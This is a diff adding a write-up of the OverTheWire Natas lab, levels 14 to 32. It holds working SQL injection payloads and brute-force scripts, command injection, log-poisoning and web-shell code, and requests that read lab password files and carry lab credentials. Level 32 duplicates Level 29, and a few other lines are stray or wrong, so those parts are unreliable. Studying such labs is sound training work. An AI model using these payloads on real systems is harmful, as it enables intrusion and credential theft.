@@ -163,7 +163,424 @@ print("Nueva cookie para 'data':", cookie_value)
     <p> and using a python code we created a php file with command execution code. Then intercepting the request and changing some values makes the magic</p>
     </ul>
         
-<h2>Level 14</h2>
+    <h2>Level 14</h2>
+    <ul>
+        <p>We are back, had to request a database reset since it was broken</p>
+        <p>This is the simple case of SQL injection analyzing the code we discovered that the database is a mysql so using the following payload we got the passwd</p>
+        <pre><code class="language-url">" OR 1 = 1 -- -</code></pre>
+    </ul>
+
+    <h2>Level 15</h2>
+    <ul>
+        <p>In that case we cant see the results since this is a case of Blind SQL injection</p>
+        <p>First of all we identify our target user and its password lenght</p>
+        <pre><code class="language-url">" OR LENGTH((SELECT password FROM users WHERE username='natas16'))=32-- -</code></pre>
+        <p>Now that we now the length its time to check char by char the password. The thing here is to use <b>BINARY</b> operator since it's case sensitive</p>
+        <p>With the following string we are comparing the if the first char of the password ofr user natas16 is equal to the value "q"</p>
+        <pre><code class="language-url">" OR BINARY SUBSTRING((SELECT password FROM users WHERE username='natas16'),1,1)='q' -- -</code></pre>
+        <p>Since this is a large process we created a script</p>
+        
+        <p>This is the simple case of SQL injection analyzing the code we discovered that the database is a mysql so using the following payload we got the passwd</p>
+        <pre><code class="language-bash">#!/bin/bash
+
+URL="http://natas15.natas.labs.overthewire.org/index.php"
+USER="natas16"
+CHARSET="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+PASS=""
+LENGTH=32   # ya sabes que son 10 caracteres
+
+for ((pos=1; pos<=LENGTH; pos++)); do
+    for ((i=0; i<${#CHARSET}; i++)); do
+        c=${CHARSET:$i:1}
+        PAYLOAD="\" OR SUBSTRING((SELECT password FROM users WHERE username='$USER'),$pos,1)='$c' -- -"
+        
+        # Enviar petición
+	#" OR SUBSTRING((SELECT password FROM users WHERE username='alice'),10,1)='4' -- -
+        RESP=$(curl -X POST "http://natas15.natas.labs.overthewire.org/index.php" \
+  -H "Host: natas15.natas.labs.overthewire.org" \
+  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" \
+  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8" \
+  -H "Accept-Language: en-US,en;q=0.5" \
+  -H "Accept-Encoding:  deflate" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -H "Origin: http://natas15.natas.labs.overthewire.org" \
+  -H "Authorization: Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA==" \
+  -H "Connection: keep-alive" \
+  -H "Referer: http://natas15.natas.labs.overthewire.org/index.php" \
+  -H "Cookie: _ga_RD0K2239G0=GS2.1.s1754469229\$o9\$g1\$t1754469235\$j54\$l0\$h0; _ga=GA1.1.1589158299.1753534300" \
+  -H "Upgrade-Insecure-Requests: 1" \
+  -H "Priority: u=0, i" \
+  --data-raw "username=%22%20OR%20BINARY%20SUBSTRING%28%28SELECT%20password%20FROM%20users%20WHERE%20username%3D%27natas16%27%29%2C$pos%2C1%29%3D%27$c%27%20--%20-");
+
+        if [[ $RESP == *"This user exists"* ]]; then
+            PASS+=$c
+            echo "[+] Posición $pos: $c → $PASS"
+            break
+        fi
+    done
+done
+
+echo "[*] Contraseña completa: $PASS"</code></pre>
+    <p>Yes i know, i would have done it with python and this looks horrible (curl)</p>
+    </ul>
+
+    <h2>Level 16</h2>
+    <ul>
+        <p>In that case there are restrictions in order to avoid a RCE. But not all characters are included in the restriction</p>
+        <p>So we can use </p>
+        <pre><code class="language-bash">$(command)</code></pre>
+        <p>The thing here is that we introduce a word and then internally the server performs a grep over a file and returns coincidences</p>
+        <p>So there is a tricky way of nowing the password localted at /etc/natas_webpass/natas17</p>
+        <p>The software does grep $word dictionary</p>
+        <p>So if we introduce: </p>
+        <pre><code class="language-bash">$(grep a /etc/natas_webpass/natas17)Africans</code></pre>
+        <p>there will be two possible results</p>
+        <ul>
+            <li>In case the word <b>a</b> exists our grep will result: <b>aAfricans</b></li>
+            <ul>
+                <li>Then the previous grep will take our result (aAfricans) and look for it in the dictionary.txt. Since the word will not exist we won't get a result which confirms that a exists in the password</li>
+            </ul>
+            <li>In case the word <b>a</b> doest not exists our grep will result: <b>Africans</b></li>
+            <ul>
+                <li>Then the previous grep will take our result (Africans) and look for it in the dictionary.txt. Since the word will exist we will get a result which confirms that a does not exists in the password</li>
+            </ul>
+        </ul>
+        <p>Since this process of checking every char is so large we created a script to automate it</p>
+        <pre><code class="language-python">import requests
+
+url = 'http://natas16.natas.labs.overthewire.org/'
+auth = ('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')  # Cambia esto
+marker = 'Africans'  # Palabra que sabes que está en dictionary.txt
+
+# Tu charset descubierto
+charset = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+
+password = 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0'
+
+while len(password) < 32:
+    for c in charset:
+        test = password + c
+        payload = f'$(grep ^{test} /etc/natas_webpass/natas17){marker}'
+        params = {'needle': payload, 'submit': 'Search'}
+
+        print(f"[?] Probando: {test}")
+        r = requests.get(url, auth=auth, params=params)
+
+        if marker not in r.text:
+            print(f"[+] Letra encontrada: {c}")
+            password += c
+            break
+
+print(f"[✔] Contraseña completa: {password}")
+</code></pre>        
+    </ul>
+
+    <h2>Level 17</h2>
+    <ul>
+        <p>In this case we are in front of a time-based sql injection where correct answers take more time to complete than incorrect ones</p>
+        <p>First of all we identify that time-base sql injection since using the following injection that checks the length of the password takes a lot of time when the answer is correct. This is since the sleep is executed</p>
+        <pre><code class="language-sql">" OR IF(LENGTH((SELECT password FROM users WHERE username='natas18'))=32, SLEEP(5), 0)-- -</code></pre>
+        <p>Then we can start checking letter by letter the password from natas18</p>
+        <pre><code class="language-sql">" OR IF(BINARY SUBSTRING((SELECT password FROM users WHERE username='natas18'),32,1)='a', SLEEP(5), 0) -- -</code></pre>
+        <p>Depending of your connection the script may produce false positive so in case many chars are discovered suspect of it and confirm it by using a proxy like burp or caido</p>
+        <p>In my case perfor a table like the following help me to not lose the directions</p>
+        <pre><code class="language-html">6 O G 1 P b K d V j  y  B  l  p  x  g  D  4  D  D  b  R  G  6  Z  L  l  C  G  g  C  J
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  </code></pre>
+        <p>Building the follwing script automates all the process</p>
+        <pre><code class="language-python">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+import requests
+from time import time
+
+# Conjunto de caracteres válidos para la contraseña
+characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+
+username = 'natas17'
+password = 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'
+
+url = f'http://{username}.natas.labs.overthewire.org/'
+
+# Usamos una sesión para mantener la conexión viva
+session = requests.Session()
+
+# Empezamos con la cadena conocida '6OG1'
+seen_password = list("6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgC")
+
+while len(seen_password) < 32:
+    for character in characters:
+        attempt = ''.join(seen_password) + character
+        print(f"Trying: {attempt}")
+
+        start_time = time()
+
+        # Inyección con BINARY y LIKE para case-sensitive y coincidencia de prefijo
+        payload = f'natas18" AND BINARY password LIKE "{attempt}%" AND SLEEP(1) # '
+        response = session.post(
+            url,
+            data={"username": payload},
+            auth=(username, password)
+        )
+
+        _ = response.text  # Fuerza la lectura completa del body
+        elapsed = time() - start_time
+
+        if elapsed > 1:
+            seen_password.append(character)
+            print(f"[+] Encontrado: {character} → {''.join(seen_password)}")
+            break
+
+print(f"[*] Contraseña completa: {''.join(seen_password)}")
+</code></pre>    
+    </ul>
+
+    <h2>Level 18</h2>
+    <ul>
+        <p>Taking a look at the phpsessid we see that is a simple number which in the code its especified that will not be upper 640. Since it could be possbility which one of this php ids would be the admin we used CAIDO to fuzz it.  Revealing that phpsessid 119 is the one</p>
+    </ul>
+
+    <h2>Level 19</h2>
+    <ul>
+        <p>Since this time the phpsesid it is built with like this </p>
+        <pre><code class="language-url">(A code from 1 to 640) - username</code></pre>
+        <p>We developed a script which generates all possible phpsessid using the username “admin”</p>
+        <p>Then with the use of all different phpsessid we used CAIDO to fuzz them all and finding that this “3238312d61646d696e” was the one</p>
+    </ul>
+
+    <h2>Level 20</h2>
+    <ul>
+        <p>Looking at the code we identify that users are saved in a file with the following format</p>
+        <pre><code class="language-url">user 
+admin 0</code></pre>
+        <p>Since there is no sanitization we could send a package with the following content obviously encoded</p>
+        <pre><code class="language-url">user%0Aadmin%201</code></pre>
+        <p>which is equal to:</p>
+        <pre><code class="language-url">user 
+admin 1</code></pre>
+    </ul>
+
+    <h2>Level 21</h2>
+    <ul>
+        <p>As we can see the parameters of the website to change colors are not sanitized so we can pass the parameter admin = 1 and retrieve the phpsessid of the admin </p>
+        <p>discovering... PHPSESSID:"7airoif8j2l4v9h1j84e4csfs0"</p>
+        <p>Change that cookie and login as admin</p>
+        <pre><code class="language-url">" OR 1 = 1 -- -</code></pre>
+    </ul>
+
+    <h2>Level 22</h2>
+    <ul>
+        <p>As the code, shows the parameter revelio must be passed so as we did it.</p>
+        <p>This lab seems only to work with a proxy like CAIDO, BURP o ZAP</p>
+        <p>natas22.natas.labs.overthewire.org/ndex.php?revelio</p>
+    </ul>
+
+
+    <h2>Level 23</h2>
+    <ul>
+        <p>The code shows...</p>
+        <pre><code class="language-php">if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 ))</code></pre>
+        <p>Which means that the password must contain the word iloveyou and this one must be greater than 10</p>
+        <p>Since php when it has to compare a string (iloveyou) with a number (10) all letter are converted to 0 and numbers of the string keep the same</p>
+        <pre><code class="language-url">So incase of    iloveyou > 10 = 0 
+but with:       123iloveyou > 10 = 123</code></pre>
+        <p>So our string to achieve the password will be with a number greater than 10 for example</p>
+        <pre><code class="language-url">GET /?passwd[]=test</code></pre>
+    </ul>
+
+    <h2>Level 25</h2>
+    <ul>
+        <p>The code has two restrictions the first one replaces ../ with “” so we used double ....// to achieve ../</p>
+        <pre><code class="language-url">//....//....//....//....//....//etc//natas_webpass//natas26</code></pre>
+        <p>The second one check if the url has natas_pass since this is the directory where all passwords are stored in this lab. To bypass it we look at the code and found out that every time anything tricky its performed a line is saved into a log file and User Agent is also saved so we injected php code into it in order to inject commands</p>
+        <p>We used cat to show contents and append it into the log file we can view throuh LFI</p>
+        <pre><code class="language-php">&lt;?php system("cat /etc/natas_webpass/natas26 > /var/www/natas/natas25/logs/natas25_359j0g1sk3km0418ma9brk2arm.log");?></code></pre>
+        <p>Then checking with the following URL we can view the file </p>
+        <pre><code class="language-url">http://natas25.natas.labs.overthewire.org/index.php?lang=//....//....//....//....//....//var/www/natas/natas25/logs/natas25_359j0g1sk3km0418ma9brk2arm.log</code></pre>
+        
+    </ul>
+
+    <h2>Level 26</h2>
+    <ul>
+        <p>This is called PHP Object Injection</p>
+        <p>When we look at the code we find</p>
+        <pre><code class="language-php">if (array_key_exists("drawing", $_COOKIE)){
+    $drawing = unserialize(base64_decode($_COOKIE["drawing"]));
+}</code></pre>
+        <p>This means that a value we control which is the cookie will be serialzed and encoded. Using that we created a code which creates a file in </p>
+        <pre><code class="language-php">img/shell.php</code></pre>
+        <p>and sets the followig code inside of it</p>
+        <pre><code class="language-php">&lt;?php system($_GET["cmd"]); ?></code></pre>
+        <p>Using that code we created a cookie that performs all previously said and intercepted a query to insert that cookie.</p>
+        <p>Then use the parameter to view the password</p>
+        <pre><code class="language-url">shell.php?cmd=cat /etc/natas_webpass/natas27</code></pre>
+    </ul>
+
+    <h2>Level 27</h2>
+    <ul>
+        <p>The thing here is to create a new user called natas28 tricking the database with random spaces</p>
+        <p>Since the username is only 64 bytes long we can introduce a larger string and this one will be truncated </p>
+        <pre><code class="language-url">natas28                                                         x
+anypassword</code></pre>
+        <p>With that credentials we'll create a new user which will enable us to login as natas28 with the credentials we set since there is a conflict due how database is configured. It can be two usernames with the same name</p>
+        <p>Im not gonna lie at 12/08/2025 this lab seems not to work so we copied the password online</p>
+    </ul>
+
+    <h2>Level 28</h2>
+    <ul>
+        <p>This lab was very hard for me to undestand so i used external help to and i still dont understand the whole process. I'll explain whats clear to me</p>
+        <p>We identify that there is a string which may vary based on the word we introduce, but there are some parts of the string that stay the same. This reveals that we are in front of some sort of block cipher</p>
+        <p>The string is URL encoded and base 64 encoded. Here you can se two example using different words</p>
+        <pre><code class="language-url">test
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPK%2FZEJpSw8lYr3%2BNDY3VpFZKSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPK/ZEJpSw8lYr3+NDY3VpFZKSh/PMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY=
+
+
+testX
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLLyKQ9ELzPgX%2Bo406jj8aMrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ%2FOns%3D
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLLyKQ9ELzPgX+o406jj8aMrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ/Ons=</code></pre>
+        <p>To get more information about the encryption mechanism, we need the key length first.</p>
+        <p>We used the following script to check diferent chars and compare strings</p>
+        <pre><code class="language-python">import requests
+import string
+from requests.auth import HTTPBasicAuth
+import urllib.parse
+
+basicAuth=HTTPBasicAuth('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')
+
+u="http://natas28.natas.labs.overthewire.org/index.php"
+
+count = 0
+headers = {'Content-Type': 'application/x-www-form-urlencoded' }
+
+while count <= 16:
+    data = "query=" + "A"*count
+    response = requests.post(u, headers=headers, data=data, auth=basicAuth, verify=False, allow_redirects=True)
+    print("{:02d}".format(count), "chars ", urllib.parse.unquote(response.url))
+    count += 1
+
+print("Done!")
+</code></pre>
+
+        <p>Here i spotted several parts that look the same. Here it comes a legend</p>
+
+        <pre><code class="language-url">🟥 G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP
+🟦 JfIqcn9iVBmkZvmvU4kfmy
+🟩 rlHX2nGysIPZGaDXuIuY   e6ymVfKYoyHpDj96YNTY   jFdz7MKPhw5PTrxsgHCk jrGh/iYaLGwVBhEJs/7a   (At the end of last 4 lines) 
+</code></pre>
+
+    <pre><code class="language-url">┌──(kali㉿kali)-[~/Desktop/Overthewire/Natas/natas28]
+└─$ python3 attempt.py
+00 chars  http://natas28.natas.labs.overthewire.org/search.php/?query=G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLof/YMma1yzL2UfjQXqQEop36O0aq+C10FxP/mrBQjq0eOsaH+JhosbBUGEQmz/to=
+01 chars  http://natas28.natas.labs.overthewire.org/search.php/?query=G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKjd8MKDZZIiKG51FNeoPjUvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+02 chars  http://natas28.natas.labs.overthewire.org/search.php/?query=G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKYsNYgsg1hFJebd+JNix06SHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc=
+03 chars  http://natas28.natas.labs.overthewire.org/search.php/?query=G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJ8EmoxKU1njKubmw7+RDt1mi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo=
+04 chars  http://natas28.natas.labs.overthewire.org/search.php/?query=G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPK02918sQNUadassvlSAHDHKSh/PMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY=
+05 chars  http://natas28.natas.labs.overthewire.org/search.php/?query=G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJLk0xdEarIh+MvTkV61TlvrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ/Ons=
+06 chars  http://natas28.natas.labs.overthewire.org/search.php/?query=G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJ+DZedSJQqwrZX9tfUGM7WQcCYxLrNxe2TV1ZOUQXdfmTQ3MhoJTaSrfy9N5bRv4o=
+07 chars  http://natas28.natas.labs.overthewire.org/search.php/?query=G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKvwmKMYUAmbbaAruK1epuIZIaVSupG+5Ppq4WEW09L0Nf/K3JUU/wpRwHlH118D44=
+08 chars  http://natas28.natas.labs.overthewire.org/search.php/?query=G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLNQ6RxZsY7UPRe5yiycfUiiW3pCIT4YQixZ/i0rqXXY5FyMgUUg+aORY/QZhZ7MKM=
+09 chars  http://natas28.natas.labs.overthewire.org/search.php/?query=G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKIFsYeK8Y3JmD4ecRfI3d+oJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5+MA=
+10 chars  http://natas28.natas.labs.overthewire.org/search.php/?query=G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
+11 chars  http://natas28.natas.labs.overthewire.org/search.php/?query=G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyNjNpR93/Bz0TLCI5HmVRCMqM9OYQkTq645oGdhkgSlo=
+12 chars  http://natas28.natas.labs.overthewire.org/search.php/?query=G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyh1J9Q3czmMbvHxFKUToAKHX9UET9Bj0m9rt/c0tByJk=
+13 chars  http://natas28.natas.labs.overthewire.org/search.php/?query=G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyxkduQZYZ04f0V3MSJfFf4WIjoU2cQpG5h3WwP7xz1O3YrlHX2nGysIPZGaDXuIuY
+14 chars  http://natas28.natas.labs.overthewire.org/search.php/?query=G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy8E3OxOtrwX6aLupZE7rN8kJXo0PararywOOh1xzgPdF7e6ymVfKYoyHpDj96YNTY
+15 chars  http://natas28.natas.labs.overthewire.org/search.php/?query=G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyBCVa4WFY0V3lE8rdLRyW4qdz8xhQlKoBQI8fl9A304VnjFdz7MKPhw5PTrxsgHCk
+16 chars  http://natas28.natas.labs.overthewire.org/search.php/?query=G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy4982HGOTYZrHs+nQl7ERrqd+jtGqvgtdBcT/5qwUI6tHjrGh/iYaLGwVBhEJs/7a
+Done!</code></pre>
+    
+    <p>This increase in length, as well as the length of the chars in the blue box, are roughly the same size. If we take an example string from the blue box, JfIqcn9iVBmkZvmvU4kfmy, it is 22 chars in length (in base64 format) but 16 chars when we base64 decode it.</p>    
+    <p>If we break apart the encrypted stream in segments of the size of the, cipher-block, we realize that the first two blocks are always the same.
+The third block varies, but we know that if our input exceeds the 9 chars, a new block is required.
+We can try and add some padding to our message, to guess the last character of the 3rd block.</p>
+
+
+    <p>We have seen the character "%". The odds are that the query is some SQL statement
+    that compares strings using something like:
+    SELECT text from jokes where text LIKE '%string%'
+    We tried to input quotes, but they seem to be filtered. That means we might use our
+    padding again to push the original quotes out of the third block, and inject some extra blocks.</p>
+    
+    <pre><code class="language-python">injection = 'a' * 9 + '\' UNION SELECT password from users; #'
+blocks = math.ceil((len(injection)-10)/block_size)  # How many blocks our payload takes (without padding).</code></pre>
+    <p>Now we can pretty much encode whatever we want; let's encode our injection, and then encode a request
+# long enough to fill a complete block, and then put our malicious bytes there.</p>
+    
+<pre><code class="language-url">http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsbWY4bHaEWFEfgtXy4iixC3kHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b%2BKc4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%3D</code></pre>
+        <p>With the following script all process is automated and we get the password <a class="notion-link" href="https://github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas28.py">Here</a></p>
+</ul>
+
+    <h2>Level 29</h2>
+    <ul>
+        <p>The website show us some files to read which lead to nowhere</p>
+        <p>First we figure out that to execute commands we need the %00 at the end  (|command%00)</p>
+        <p>But thats not all, natas word is restricted so we used wildcards to read the file</p>
+        <pre><code class="language-url">http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/nat*as_webpass/nat*s30%00</code></pre>
+    </ul>
+
+    <h2>Level 30</h2>
+    <ul>
+        <p>Based on how data is passed in in case we send multiple values to the password the server will return an array (Things of perl)</p>
+        <p>We sent this where 4 is the code for the type SQL_INTEGER</p>
+        <p>password = ["'lol' or 1", 4]</p>
+        <p>This results in a </p>
+        <pre><code class="language-sql">SELECT * FROM users WHERE username = 'natas31' AND password = 'lol' or 1</code></pre>
+        <p>When $dbh->quote recieves the second parameter with a numeric type it does not quote the value with double quotes because it asumes that is a number not a string</p>
+        <p>This resuts in a query OR 1 which is always true</p>
+    </ul>
+
+    <h2>Level 31</h2>
+    <ul>
+        <p>Basicallly in this case the code simpli takes the file we upload proceed to split it and then print the output </p>
+        <p>The thing here is that there is the Pinnacle attack in perl which basically tells us that CGI component is vulnerable since you could pass more than one file</p>
+        <p>Playing with the arguments we can pass and adding a new file to the petition we can print any file from the server</p>
+        <p>Here is the request</p>
+
+        <pre><code class="language-url">POST /index.pl?/etc/natas_webpass/natas32 HTTP/1.1
+Host: natas31.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------243000595620820762682363204443
+Content-Length: 680
+Origin: http://natas31.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMzMTptN2JmakFIcEptU1lnUVdXZXFSRTJxVkJ1TWlSTnEweQ==
+Connection: keep-alive
+Referer: http://natas31.natas.labs.overthewire.org/index.pl
+Cookie: _ga_RD0K2239G0=GS2.1.s1754900659$o19$g0$t1754900659$j60$l0$h0; _ga=GA1.1.1589158299.1753534300
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+-----------------------------243000595620820762682363204443
+Content-Disposition: form-data; name="file"
+ARGV
+
+-----------------------------243000595620820762682363204443
+Content-Disposition: form-data; name="file"; filename="username.csv"
+Content-Type: text/csv
+
+Username; Identifier;First name;Last name
+booker12;9012;Rachel;Booker
+
+-----------------------------243000595620820762682363204443
+
+Content-Disposition: form-data; name="submit"
+
+Upload
+
+-----------------------------243000595620820762682363204443--
+
+Password will be listed here</code></pre>
+    </ul>
+
+    <h2>Level 32</h2>
+    <ul>
+        <p>The website show us some files to read which lead to nowhere</p>
+        <p>First we figure out that to execute commands we need the %00 at the end  (|command%00)</p>
+        <p>But thats not all, natas word is restricted so we used wildcards to read the file</p>
+        <pre><code class="language-url">http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/nat*as_webpass/nat*s30%00</code></pre>
+    </ul>
 
         </div>
     </div>
